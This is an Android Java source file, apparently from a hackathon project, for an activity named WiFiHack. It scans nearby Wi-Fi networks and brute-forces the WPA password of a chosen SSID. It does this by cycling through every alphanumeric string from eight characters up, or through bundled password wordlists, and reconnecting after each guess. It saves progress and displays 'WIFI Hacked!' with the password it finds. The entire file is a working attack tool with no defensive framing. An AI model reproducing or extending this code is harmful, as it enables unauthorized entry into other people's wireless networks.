package com.example.hackfest;

import android.Manifest;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class WiFiHack extends AppCompatActivity {
    EditText passw, ssid;
    Button back, hack, hack2, hack3, reset;
    TextView listofwifi;
    SharedPreferences myPref;
    final boolean[] checkif = {false, false};
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        try {
            this.getSupportActionBar().hide();
        } catch (NullPointerException e) {
        }

        super.onCreate(savedInstanceState);
        setContentView(R.layout.wifi);
        ssid = findViewById(R.id.ssid);
        passw = findViewById(R.id.wifipass);
        back = findViewById(R.id.goBack);
        hack = findViewById(R.id.hackwifi);
        listofwifi = findViewById(R.id.listofwifi);
        reset = findViewById(R.id.reset);
        hack2 = findViewById(R.id.hackwifi2);
        hack3 = findViewById(R.id.hackwifi3);
        myPref =getApplicationContext().getSharedPreferences("MyPref", MODE_PRIVATE);
        String password = myPref.getString("pw", "");
        int data = 0;
        int data2 = 0;
        String data3 = "";
        String datacopy = "";
        int[] data4 = {};
        if(password=="") {
            data = myPref.getInt("loop", 0);
            data2= myPref.getInt("loop2", 0);
            data3 = myPref.getString("valuestring", "");
            datacopy = myPref.getString("output2", "");
            data4 = new int[data2];
            if(datacopy != "" && data2 !=0){
                for (int i = 0; i < datacopy.length(); i++) {
                    data4[i] = Integer.parseInt(String.valueOf(datacopy.charAt(i)));
                }
            }

        }
        WifiManager mWifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        ArrayList <String> arr3 = new ArrayList<>();
        final BroadcastReceiver mWifiScanReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent intent) {
                if (intent.getAction().equals(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)) {
                    List<ScanResult> mScanResults = mWifiManager.getScanResults();
                    String val = "Nearby WIFI SSID: \n";
                    int count = 1;
                    for (ScanResult i : mScanResults) {
                        arr3.add(i.SSID);
                        val+="\n"+count+". "+i.SSID;
                        count++;

                    }
                    listofwifi.setText(val);
                }

            }
        };
        if(password=="") {
            if (!checkif[0]) {
                if (data != 0 && data2 != 0 && data3 != "" && datacopy != "") {
                    start(data3, passw, data, data2, data4);
                }
            }
        }else{
            hack.setVisibility(View.INVISIBLE);
            hack2.setVisibility(View.INVISIBLE);
            hack3.setVisibility(View.INVISIBLE);
            ssid.setFocusable(false);
            ssid.setFocusableInTouchMode(false);
            ssid.setClickable(false);
            reset.setVisibility(View.VISIBLE);
            String namessid = myPref.getString("namessid", "");
            passw.append("\nWIFI Hacked! SSID: ('"+namessid+"') WiFi password: " + password);
        }

        registerReceiver(mWifiScanReceiver,
                new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        mWifiManager.startScan();

        hack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String networkSSID = ssid.getText().toString();
                start(networkSSID, passw, 0, 8, new int[8]);
            }
        });
        ArrayList<String>arrlist = commonwifipassword();
        ArrayList<String>arrlist2 = wifipassword();
        hack2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String networkSSID = ssid.getText().toString();
                checkpass(networkSSID, passw, 0, 8, arrlist);
            }
        });
        hack3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String networkSSID = ssid.getText().toString();
                checkpass(networkSSID, passw, 0, 8, arrlist2);
            }
        });

        back.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(WiFiHack.this, MainMenu.class);
                startActivity(intent);
                finish();
            }
        });
        reset.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                myPref.edit().putString("pw", "").apply();
                myPref.edit().putInt("loop", 0).apply();
                myPref.edit().putInt("loop2", 0).apply();
                myPref.edit().putString("output2", "").apply();
                myPref.edit().putString("valuestring", "").apply();
                ssid.setFocusable(true);
                ssid.setFocusableInTouchMode(true); // user touches widget on phone with touch screen
                ssid.setClickable(true);
                hack.setVisibility(View.VISIBLE);
                hack2.setVisibility(View.VISIBLE);
                hack3.setVisibility(View.VISIBLE);
                reset.setVisibility(View.INVISIBLE);

                Intent intent = new Intent(WiFiHack.this, WiFiHack.class);
                startActivity(intent);
                finish();
            }
        });
    }
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults){

    }
    private static String print(char[] values, int r, int[] output)
    {
        String val = "";
        while(r-- > 0)
        {
            val+=values[output[r]];
        }
        return val;
    }



    public void start(String networkSSID, EditText passw, int data, int data2, int[] output2){
        ssid.setFocusable(false);
        ssid.setFocusableInTouchMode(false);
        ssid.setClickable(false);
        reset.setVisibility(View.VISIBLE);
        hack.setVisibility(View.INVISIBLE);
        hack2.setVisibility(View.INVISIBLE);
        hack3.setVisibility(View.INVISIBLE);
        new Thread(new Runnable() {
            public void run() {
                try {
                        checkif[0] = true;
                        boolean check = false;
                        WifiConfiguration conf = new WifiConfiguration();
                        conf.SSID = "\"" + networkSSID + "\"";
                        int r = data2;
                        String val = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                        char[] values = val.toCharArray();
                        int n = values.length;
                        String value = "";
                        while (!check) {
                            int output[] = new int[r];
                            for (int numIterations = data; numIterations < Math.pow(n, r); numIterations++) {
                                ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                                NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                                if (mWifi.isConnected()) {
                                    check = true;
                                    break;
                                } else {
                                    if (output2 != new int[r]) {
                                        output = output2;
                                    }
                                    String getstring = "";
                                    for (int i = 0; i < output.length; i++) {
                                        getstring += output[i];
                                    }
                                    myPref.edit().putString("output2", getstring).apply();
                                    myPref.edit().putInt("loop", numIterations).apply();
                                    myPref.edit().putInt("loop2", r).apply();
                                    myPref.edit().putString("valuestring", networkSSID).apply();
                                    String str = print(values, r, output);
                                    value = str;
                                    passw.append("\n(" + networkSSID + ") Testing pass: " + str);
                                    conf.preSharedKey = "\"" + str + "\"";
                                    WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                                    wifiManager.addNetwork(conf);
                                    if (ActivityCompat.checkSelfPermission(WiFiHack.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                        return;
                                    }
                                    List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
                                    for (int z=0; z<list.size(); z++) {
                                        if (list.get(z).SSID != null && list.get(z).SSID.equals("\"" + networkSSID + "\"")) {
                                            wifiManager.disconnect();
                                            wifiManager.enableNetwork(list.get(z).networkId, true);
                                            wifiManager.reconnect();
                                            break;
                                        }
                                    }
                                    boolean gh = false;
                                    int count = 0;
                                    while (true) {
                                        Thread.sleep(1300);
                                        boolean z = mWifi.isConnected();
                                        if (z) {
                                            gh = true;
                                            break;
                                        }else if(count == 3){
                                            break;
                                        }
                                        count++;
                                    }
                                    if (gh) {
                                        check=true;
                                        break;
                                    }

                                    int index = 0;
                                    while (index < r) {
                                        if (output[index] < n - 1) {
                                            output[index]++;
                                            break;
                                        } else {
                                            output[index] = 0;
                                        }
                                        index++;
                                    }

                                }
                            }
                            r++;
                        }
                    myPref.edit().putString("pw", value).apply();
                    myPref.edit().putString("valuestring", null).apply();
                    myPref.edit().putString("output2", null).apply();
                    myPref.edit().putInt("loop", 0).apply();
                    myPref.edit().putInt("loop2", 0).apply();
                    myPref.edit().putString("namessid", networkSSID).apply();
                    String passwords = myPref.getString("pw", "");
                    String namessid = myPref.getString("namessid", "");
                    passw.append("\nWIFI Hacked! SSID: ('"+namessid+"') WiFi password: " + passwords);
                } catch (Exception e) {
                    e.getLocalizedMessage();
                }
            }
        }).start();
    }
    public void checkpass(String networkSSID, EditText passw, int data, int data2, ArrayList<String> pwlist){
        ssid.setFocusable(false);
        ssid.setFocusableInTouchMode(false);
        ssid.setClickable(false);
        reset.setVisibility(View.VISIBLE);
        hack.setVisibility(View.INVISIBLE);
        hack2.setVisibility(View.INVISIBLE);
        hack3.setVisibility(View.INVISIBLE);
        new Thread(new Runnable() {
            public void run() {
                try {
                    checkif[0] = true;
                    WifiConfiguration conf = new WifiConfiguration();
                    conf.SSID = "\"" + networkSSID + "\"";
                    int r = data2;
                    String value = "";
                    for(int i=data; i<pwlist.size(); i++) {
                        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                        if (mWifi.isConnected()) {
                            break;
                        } else {
                            int numIterations = i;
                            String getstring = pwlist.get(i);
                            myPref.edit().putString("output2", getstring).apply();
                            myPref.edit().putInt("loop", numIterations).apply();
                            myPref.edit().putInt("loop2", r).apply();
                            myPref.edit().putString("valuestring", networkSSID).apply();

                            value = getstring;
                            passw.append("\n(" + networkSSID + ") Testing pass: " + getstring);
                            conf.preSharedKey = "\"" + getstring + "\"";
                            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                            wifiManager.addNetwork(conf);
                            if (ActivityCompat.checkSelfPermission(WiFiHack.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                return;
                            }
                            List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();

                            for (int z=0; z<list.size(); z++) {
                                if (list.get(z).SSID != null && list.get(z).SSID.equals("\"" + networkSSID + "\"")) {
                                    wifiManager.disconnect();
                                    wifiManager.enableNetwork(list.get(z).networkId, true);
                                    wifiManager.reconnect();
                                    break;
                                }
                            }
                            boolean gh = false;
                            int count = 0;
                            while (true) {
                                Thread.sleep(750);
                                boolean z = mWifi.isConnected();
                                if (z) {
                                    gh = true;
                                    break;
                                }else if(count == 3){
                                    break;
                                }
                                count++;
                            }
                            if (gh) {
                                break;
                            }

                        }
                    }
                    myPref.edit().putString("pw", value).apply();
                    myPref.edit().putString("valuestring", null).apply();
                    myPref.edit().putString("output2", null).apply();
                    myPref.edit().putInt("loop", 0).apply();
                    myPref.edit().putInt("loop2", 0).apply();
                    myPref.edit().putString("namessid", networkSSID).apply();
                    String passwords = myPref.getString("pw", "");
                    String namessid = myPref.getString("namessid", "");
                    passw.append("\nWIFI Hacked! SSID: ('"+namessid+"') WiFi password: " + passwords);
                } catch (Exception e) {
                    e.getLocalizedMessage();
                }
            }
        }).start();
    }

    private ArrayList<String> commonwifipassword()
    {
        ArrayList<String> arrayList = new ArrayList<String>();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(
                    new InputStreamReader(getAssets().open("password2.txt"), "UTF-8"));
            String mLine;
            while ((mLine = reader.readLine()) != null) {
                arrayList.add(mLine);
            }

        } catch (IOException e) {
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                }
            }
        }
        return arrayList;
    }
    private ArrayList<String> wifipassword()
    {
        ArrayList<String> arrayList = new ArrayList<String>();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(
                    new InputStreamReader(getAssets().open("password.txt"), "UTF-8"));
            String mLine;
            while ((mLine = reader.readLine()) != null) {
                arrayList.add(mLine);
            }
        } catch (IOException e) {
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                }
            }
        }
        return arrayList;
    }
}